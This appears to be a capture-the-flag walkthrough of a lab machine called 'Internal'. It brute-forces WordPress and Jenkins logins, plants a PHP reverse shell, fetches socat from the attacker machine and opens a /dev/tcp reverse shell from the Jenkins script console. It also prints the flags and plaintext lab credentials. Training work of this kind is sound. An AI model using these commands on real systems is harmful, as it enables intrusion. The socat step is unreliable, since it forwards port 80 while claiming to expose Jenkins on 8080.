**Internal**

Penetration Testing Challenge

Having accepted the project, you are provided with the client assessment environment.  Secure the User and Root flags and submit them to the dashboard as proof of exploitation.

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

**Scope of Work**

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

* User.txt
* Root.txt

Additionally, the client has provided the following scope allowances:

* Ensure that you modify your hosts file to reflect internal.thm
* Any tools or techniques are permitted in this engagement
* Locate and note all vulnerabilities found
* Submit the flags discovered to the dashboard
* Only the IP address assigned to your machine is in scope

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

Note - this room can be completed without Metasploit


# User.txt Flag

## Services enumeration

Let's start to enumerate the services with Nmap. We discover 2 ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web enumeration (gobuster)

There is no `robots.txt` file, but `gobuster` found a a blog, likely run with Wordpress.

~~~
kali@kali:/data/The_Blob_Blog/files$ gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/03 14:28:32 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/blog (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/09/03 14:29:00 Finished
===============================================================
~~~

## Wordpress enumeration

Browsing `/blog` confirms our assumption, this is a Wordpress blog. Let's enumerate the users with `wpscan`:

~~~
kali@kali:/data/The_Blob_Blog/files$ wpscan --url http://internal.thm/blog -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.137.187]
[+] Started: Thu Sep  3 14:36:16 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Sep  3 14:36:20 2020
[+] Requests Done: 24
[+] Cached Requests: 34
[+] Data Sent: 5.936 KB
[+] Data Received: 181.104 KB
[+] Memory used: 172.43 MB
[+] Elapsed time: 00:00:03
~~~

According to WPScan, the only user is `admin`. Let's try to brute force the password, using the bruteforce feature of WPScan:

~~~
kali@kali:/data/The_Blob_Blog/files$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt 

[REDACTED]

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[REDACTED]
~~~

## Wordpress admin connection

Login (http://internal.thm/blog/wp-admin/) is successful with `admin:my2boys` and we now have the ability to modify the templates PHP source code. This will be convenient to write a reverse shell.

In the web interface, go to "Appearance > Theme Editor > 404.php" and replace the PHP code with a PHP reverse shell (e.g. http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

Open a listener (`rlwrap nc -nlvp 4444`) and call the template (http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php).

## Reverse shell

Now have a reverse shell:

~~~
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.137.187] 51322
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:46:33 up 23 min,  0 users,  load average: 0.02, 0.20, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@internal:/$ whoami
whoami
www-data
~~~

## Lateral move (www-data to aubreanna)

There is an interesting file in the `/opt` directory:

~~~
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
~~~

Let's connect as aubreanna:

~~~
www-data@internal:/opt$ su aubreanna
su aubreanna
Password: bubb13guM!@#123

aubreanna@internal:/opt$ whoami
whoami
aubreanna
~~~

## User flag

The user flag is in aubreanna's home folder:

~~~
aubreanna@internal:/opt$ cd /home/aubreanna
cd /home/aubreanna
aubreanna@internal:~$ ls -la
ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3 03:57 .
drwxr-xr-x 3 root      root      4096 Aug  3 01:40 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3 20:01 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3 01:41 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3 19:36 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3 01:53 .local
-rwx------ 1 root      root       223 Aug  3 01:56 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3 02:38 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3 01:41 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3 03:57 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3 01:41 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3 03:56 user.txt
aubreanna@internal:~$ cat user.txt
cat user.txt
THM{int3rna1_fl4g_1}
~~~

User flag: `THM{int3rna1_fl4g_1}`


# Root.txt Flag

## Check privileges

To read the root flag, we will need a privilege escalation. Unfortunately, aubreanna is not in the sudoers.

~~~
aubreanna@internal:~$ sudo -l
Sorry, user aubreanna may not run sudo on internal.
~~~

## Jenkins

There is an interesting file in aubreanna's home folder that tells us Jenkins is running on port 8080:

~~~
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
~~~

We confirm that the service is only available to localhost.

~~~
aubreanna@internal:~$ netstat -tan | grep 8080
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN    
~~~

There are several indications that docker is available on the target, and as the Jenkins documentation (https://www.jenkins.io/doc/book/installing/) explains how to install Jenkins with docker, we can assume that this is how Jenkins has been installed. If not a rabbit hole, this could be a way to elevate our privileges to root. Worth trying... 

To make Jenkins available to us (instead of just localhost), we can use `socat` to redirect ports. As `socat` is not available on the target, we have to transfer it. Here is how you can do it:

*On Kali:*

~~~
kali@kali:/data/Internal$ which socat 
/usr/bin/socat
kali@kali:/data/Internal$ cd /usr/bin/
kali@kali:/usr/bin$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
~~~

*On the target:*

~~~
aubreanna@internal:~$ cd /tmp/
aubreanna@internal:/tmp$ wget http://10.8.50.72:8000/socat
aubreanna@internal:/tmp$ chmod +x socat
aubreanna@internal:/tmp$ ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
~~~

And now, Jenkins is available to us over port 8888:

~~~
PORT     STATE SERVICE VERSION
8888/tcp open  http    Jetty 9.4.30.v20200611
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.30.v20200611)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
~~~

## Jenkins' admin password

Trying to authenticate as `admin` with `admin` or `password` as password fails. Let's try to brute force the account.

To do that, intercept the POST request in Burp Suite to build our hydra attack.

~~~
POST /j_acegi_security_check HTTP/1.1
Host: internal.thm:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://internal.thm:8888/login?from=%2F
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close
Cookie: JSESSIONID.fb3308f2=node0lfk0eau5l4zu17h43ifl0scpw36.node0
Upgrade-Insecure-Requests: 1

j_username=admin&j_password=admin&from=%2F&Submit=Sign+in
~~~

We now have all the required information. Here is the hydra attack:

~~~
kali@kali:/data/src$ hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-03 15:40:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://internal.thm:8888/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[STATUS] 396.00 tries/min, 396 tries in 00:01h, 14344003 to do in 603:43h, 16 active
[8888][http-post-form] host: internal.thm   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-03 15:41:31
~~~

We now have the admin's password. Let's connect to http://internal.thm:8888 with `admin:spongebob`.

## Reverse shell in docker

Now that we have an admin access to Jenkins, we can run commands, and we'll ultimately exploit this to have a reverse shell.

Start by running a listener (on your machine):

~~~
$ rlwrap nc -nlvp 5555
~~~

Now, in Jenkins, go to "Jenkins > Nodes > master" and click on "Script Console" from the menu. Execute the following command (found [here](https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/)):

~~~
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.50.72/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
~~~

## Root password

In our listener, we now have a reverse shell. Browsing the file system reveals that the root password is disclosed in clear:

~~~
cd /opt
ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug  3 03:31 .
drwxr-xr-x 1 root root 4096 Aug  3 03:07 ..
-rw-r--r-- 1 root root  204 Aug  3 03:31 note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
~~~

## Root flag

Back to our initial SSH connection as `aubreanna`:

~~~
aubreanna@internal:/var/backups$ su root
Password: 
root@internal:/var/backups# cd /root/
root@internal:~# ll
total 48
drwx------  7 root root 4096 Aug  3 13:16 ./
drwxr-xr-x 24 root root 4096 Aug  3 01:31 ../
-rw-------  1 root root  193 Aug  3 20:01 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug  3 02:23 .cache/
drwx------  3 root root 4096 Aug  3 02:23 .gnupg/
drwxr-xr-x  3 root root 4096 Aug  3 01:53 .local/
-rw-------  1 root root 1071 Aug  3 13:16 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Aug  3 01:40 .ssh/
-rw-r--r--  1 root root   22 Aug  3 04:13 root.txt
drwxr-xr-x  3 root root 4096 Aug  3 01:41 snap/
root@internal:~# cat root.txt 
THM{d0ck3r_d3str0y3r}
~~~

Root flag: `THM{d0ck3r_d3str0y3r}`
